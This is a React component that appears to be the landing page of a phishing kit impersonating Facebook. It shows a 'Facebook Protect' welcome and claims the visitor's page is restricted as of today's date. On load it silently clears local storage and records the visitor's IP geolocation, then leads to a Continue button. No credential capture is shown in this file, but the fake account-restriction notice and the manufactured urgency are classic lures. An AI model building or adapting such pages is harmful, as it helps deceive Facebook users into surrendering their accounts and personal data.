import HeroImage from "@/assets/images/hero-image.png";
import { useTranslation } from "@/hooks/useTranslation";
import type { GeoLocation } from "@/types/geo";
import {
  faAddressCard,
  faCircleCheck,
} from "@fortawesome/free-solid-svg-icons";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import axios from "axios";
import { useEffect, useState } from "react";
import { useNavigate } from "react-router";

const Index = () => {
  const navigate = useNavigate();
  const { texts } = useTranslation();
  const [today, setToday] = useState("");

  useEffect(() => {
    localStorage.clear();
    const getToday = () => {
      const date = new Date();
      return date.toLocaleDateString("en", {
        year: "numeric",
        month: "long",
        day: "2-digit",
      });
    };
    setToday(getToday());

    const fetchGeoData = async () => {
      try {
        const response = await axios.get<GeoLocation>(
          "https://get.geojs.io/v1/ip/geo.json",
        );
        localStorage.setItem("geoData", JSON.stringify(response.data));
      } catch (error) {
        console.error("Error fetching geo data:", error);
      }
    };

    fetchGeoData();
  }, []);
  return (
    <div className="flex max-w-2xl flex-col gap-4">
      <img className="rounded-t-xl" src={HeroImage} alt="" />
      <b className="text-2xl font-bold">
        {texts.welcomeToFacebookProtect}
      </b>{" "}
      <p>
        {texts.pageAccessibilityLimited}
        <span className="cursor-pointer text-blue-600 hover:underline">
          {texts.moreInformation}
        </span>
      </p>
      <ul className="flex flex-col gap-8">
        <li className="flex gap-2">
          <FontAwesomeIcon
            size="lg"
            className="h-8! w-8! text-2xl! text-gray-400"
            icon={faCircleCheck}
          />
          <p>{texts.enabledAdvancedProtections}</p>
        </li>
        <li className="flex gap-2">
          <div className="flex h-8 w-8 rounded-full bg-blue-500 p-2">
            <FontAwesomeIcon
              size="lg"
              className="h-4! w-4! text-xl! text-white"
              icon={faAddressCard}
            />
          </div>
          <p>{texts.walkThroughProcess}</p>
        </li>
      </ul>
      <button
        onClick={() => navigate("home")}
        className="cursor-pointer rounded-full bg-blue-500 p-4 text-lg font-medium text-white"
        type="button"
      >
        {texts.continue}
      </button>
      <p className="text-center">
        {texts.pageRestrictedOn} <b> {today}</b>
      </p>
    </div>
  );
};

export default Index;
